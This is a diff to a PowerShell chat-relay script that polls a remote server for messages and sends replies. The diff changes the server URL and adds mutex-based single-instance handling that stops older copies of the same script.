@@ -1,11 +1,36 @@
 param(
-    [string]$Server = "https://ki8ucb.wormhole.bar"
+    [string]$Server = "https://023nfn.wormhole.bar"
 )
+$mutexName = "Global\MyUniqueScriptName_8f9a2b1c"
+$createdNew = $false
+$mutex = New-Object System.Threading.Mutex($false, $mutexName, [ref]$createdNew)
 
+# 1. If another instance is running, find its process ID and terminate it
+if (-not $createdNew) {
+    $scriptName = [System.IO.Path]::GetFileName($PSCommandPath)
+    
+    # Find other PowerShell processes running this exact script filename
+    $existingProcesses = Get-CimInstance Win32_Process | Where-Object {
+        ($_.Name -match '^(powershell|pwsh)\.exe$') -and
+        ($_.ProcessId -ne $PID) -and
+        ($_.CommandLine -like "*$scriptName*")
+    }
 
+    foreach ($proc in $existingProcesses) {
+        Stop-Process -Id $proc.ProcessId -Force -ErrorAction SilentlyContinue
+    }
+}
 
+# 2. Wait until the old process dies and releases the mutex
+try {
+    [void]$mutex.WaitOne()
+}
+catch [System.Threading.AbandonedMutexException] {
+    # Normal: triggers because the previous process was forcefully killed
+}
 
-# Turns a received message into a reply. Messages starting with "!" are commands.
+try {
+    
 function Get-Reply([string]$text) {
 	$name=$text
     try {
@@ -23,7 +48,6 @@ try {
     $msgs = Invoke-RestMethod -Uri "$Server/recv?since=$since" -Method Get
     foreach ($m in $msgs) { $since = $m.id }
 } catch { }
-
 while ($true) {
     try {
         $msgs = Invoke-RestMethod -Uri "$Server/recv?since=$since" -Method Get
@@ -39,5 +63,10 @@ while ($true) {
     } catch { }
     Start-Sleep -Seconds 1
 }
+
+}
+finally {
+    $mutex.ReleaseMutex()
+    $mutex.Dispose()
 }
 
